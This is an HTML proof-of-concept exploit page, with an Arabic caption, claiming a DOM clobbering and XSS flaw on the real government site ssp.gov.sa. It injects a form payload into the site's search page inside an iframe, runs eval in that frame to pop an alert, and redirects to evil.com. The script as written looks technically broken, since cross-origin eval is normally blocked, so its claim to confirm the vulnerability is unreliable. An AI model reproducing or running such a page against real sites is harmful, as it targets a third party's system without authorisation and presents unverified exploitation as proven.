<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>DOM Clobbering PoC – ssp.gov.sa</title>
</head>
<body>
  <h3>🚨 DOM Clobbering PoC – ssp.gov.sa</h3>
  <p>إذا ظهرت الرسالة وتم التوجيه، فالثغرة مؤكدة من داخل الموقع.</p>

  <iframe id="exploit" style="width:100%; height:600px; border:2px solid red;"></iframe>

  <script>
    const payload = encodeURIComponent('<form id=location></form>');
    const exploitURL = "https://ssp.gov.sa/ar/GeneralServices/Search/Pages/default.aspx?input=" + payload;
    document.getElementById("exploit").src = exploitURL;

    // تنفيذ داخل iframe بعد ثواني
    setTimeout(() => {
      const iframe = document.getElementById("exploit");
      const iframeWin = iframe.contentWindow;

      iframeWin.eval(`
        alert(
          "✅ XSS Executed from inside victim page!\\n" +
          "🌐 Referrer: " + document.referrer + "\\n" +
          "📍 Location: " + location.href
        );
        location = 'https://evil.com';
      `);
    }, 10000);
  </script>
</body>
</html>
